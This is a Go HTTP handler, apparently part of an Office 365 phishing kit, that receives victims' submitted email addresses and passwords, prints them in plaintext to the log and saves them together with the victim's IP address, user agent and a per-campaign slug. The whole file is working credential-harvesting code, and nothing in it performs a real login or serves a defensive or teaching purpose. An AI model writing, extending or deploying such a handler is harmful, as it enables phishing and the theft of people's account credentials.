package handlers

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"o365/capture"
)

// PassCapture struct for capturing the credentials
type PassCapture struct {
	Email     string `json:"email"`
	Password  string `json:"password"`
	Hostname  string `json:"hostname"`
	UserAgent string `json:"userAgent"`
	Timestamp string `json:"timestamp"`
}

// PassHandler handles POST /pass to capture login credentials
func PassHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	// Extract the slug from the request context
	slug, ok := r.Context().Value("slug").(string)
	if !ok {
		http.Error(w, "Slug not found in request context", http.StatusBadRequest)
		return
	}

	ip := getRealIP(r)

	// Read the request body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("❌ Failed to read body: %v", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var data PassCapture
	if err := json.Unmarshal(body, &data); err != nil {
		log.Printf("❌ JSON parse error: %v", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if data.Email == "" || data.Password == "" {
		log.Println("⚠️  Incomplete credentials")
		http.Error(w, "Missing fields", http.StatusBadRequest)
		return
	}

	// Log the captured credentials for debugging
	log.Printf("[PASS] %s | %s\n - %s\n", data.Email, data.Password, data.UserAgent)

	// Save the credentials and associate with the slug
	capture.SaveCreds(map[string]string{
		"login":      data.Email,
		"passwd":     data.Password,
		"user_agent": data.UserAgent,
		"slug":       slug, // Use the slug from the request context
	}, ip)

	w.WriteHeader(http.StatusNoContent)
}
